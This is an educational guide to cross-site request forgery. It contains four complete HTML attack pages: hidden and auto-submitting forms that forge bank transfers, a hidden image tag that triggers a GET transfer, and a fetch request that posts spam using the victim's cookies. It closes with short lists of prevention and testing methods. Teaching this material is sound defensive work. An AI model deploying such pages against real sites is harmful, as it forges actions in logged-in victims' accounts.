# CSRF (Cross-Site Request Forgery) Guide

## 1. What is CSRF?

CSRF is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It occurs when a malicious website tricks a user's browser into making unwanted requests to a different website where the user is authenticated.

### Key Characteristics:
- Exploits the trust that a site has in a user's browser
- Uses the victim's existing authentication (cookies, session tokens)
- The victim unknowingly performs actions on behalf of the attacker
- Can lead to unauthorized transactions, data changes, or account compromise

### How CSRF Works:
1. User logs into a legitimate website (e.g., bank.com)
2. User visits a malicious website while still logged in
3. Malicious site sends a forged request to the legitimate site
4. The legitimate site processes the request as if it came from the user

## 2. Simple CSRF Attack Examples

### Example 1: Money Transfer Attack

**Vulnerable Endpoint:**
```
POST /transfer
Content-Type: application/x-www-form-urlencoded

amount=1000&to_account=attacker123
```

**Malicious HTML Page:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Free Gift!</title>
</head>
<body>
    <h1>Congratulations! You won a prize!</h1>
    <p>Click the button below to claim your reward:</p>
    
    <!-- Hidden form that transfers money -->
    <form action="https://bank.com/transfer" method="POST" id="maliciousForm">
        <input type="hidden" name="amount" value="1000">
        <input type="hidden" name="to_account" value="attacker123">
    </form>
    
    <button onclick="document.getElementById('maliciousForm').submit()">
        Claim Prize!
    </button>
</body>
</html>
```

### Example 2: Auto-Submit Attack

```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <p>Please wait while we process your request...</p>
    
    <!-- Form submits automatically when page loads -->
    <form action="https://bank.com/transfer" method="POST" id="autoForm">
        <input type="hidden" name="amount" value="5000">
        <input type="hidden" name="to_account" value="evil_account">
    </form>
    
    <script>
        // Auto-submit the form when page loads
        document.getElementById('autoForm').submit();
    </script>
</body>
</html>
```

### Example 3: Image Tag Attack

```html
<!DOCTYPE html>
<html>
<head>
    <title>Funny Memes</title>
</head>
<body>
    <h1>Check out these hilarious memes!</h1>
    
    <!-- GET request disguised as an image -->
    <img src="https://bank.com/transfer?amount=2000&to_account=hacker456" 
         alt="Meme" style="display:none;">
    
    <p>More content here...</p>
</body>
</html>
```

### Example 4: AJAX Attack

```html
<!DOCTYPE html>
<html>
<head>
    <title>Social Media</title>
</head>
<body>
    <h1>Welcome to our social platform!</h1>
    
    <script>
        // CSRF attack using fetch API
        fetch('https://socialmedia.com/api/post', {
            method: 'POST',
            credentials: 'include', // Include cookies
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: "I love this malicious website! Visit evil.com",
                visibility: "public"
            })
        });
    </script>
</body>
</html>
```

## Attack Scenarios

### Scenario 1: Email Change
- Victim clicks malicious link in email
- Hidden form changes email address to attacker's email
- Attacker can now reset password

### Scenario 2: Admin Privilege Escalation
- Admin user visits compromised website
- Malicious script promotes attacker to admin role
- Attacker gains full system access

### Scenario 3: Social Media Manipulation
- User visits malicious blog post
- Hidden script posts spam content to user's profile
- Spreads malware or phishing links

## Prevention Methods

1. **CSRF Tokens**: Include unique tokens in forms
2. **SameSite Cookies**: Restrict cross-site cookie sending
3. **Referer Header Validation**: Check request origin
4. **Double Submit Cookies**: Verify token in cookie and form
5. **Custom Headers**: Require specific headers for API calls

## Testing for CSRF

1. Remove CSRF tokens from requests
2. Use different user's CSRF token
3. Change request method (POST to GET)
4. Test with empty or invalid tokens
5. Check if tokens are properly validated